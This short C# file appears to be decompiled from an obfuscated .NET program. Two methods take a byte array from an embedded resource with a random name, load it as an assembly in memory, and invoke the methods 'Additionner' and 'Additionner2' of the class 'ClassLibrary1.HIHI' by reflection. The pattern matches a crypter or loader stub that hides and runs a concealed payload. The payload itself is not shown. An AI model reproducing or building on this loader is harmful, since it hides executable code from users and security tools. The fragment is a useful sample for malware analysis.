using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class5
{
	public static object smethod_0(string string_0, string string_1)
	{
		return Assembly.Load((byte[])NewLateBinding.LateIndexGet(Class6.resourceManager_0.GetObject("yqPeXIprMotHRmz"), new object[1] { 2 }, (string[])null)).GetType("ClassLibrary1.HIHI")!.GetMethod("Additionner")!.Invoke(null, new object[2] { string_0, string_1 });
	}

	public static object smethod_1(byte[] byte_0, string string_0)
	{
		return Assembly.Load((byte[])NewLateBinding.LateIndexGet(Class6.resourceManager_0.GetObject("yqPeXIprMotHRmz"), new object[1] { 2 }, (string[])null)).GetType("ClassLibrary1.HIHI")!.GetMethod("Additionner2")!.Invoke(null, new object[2] { byte_0, string_0 });
	}
}
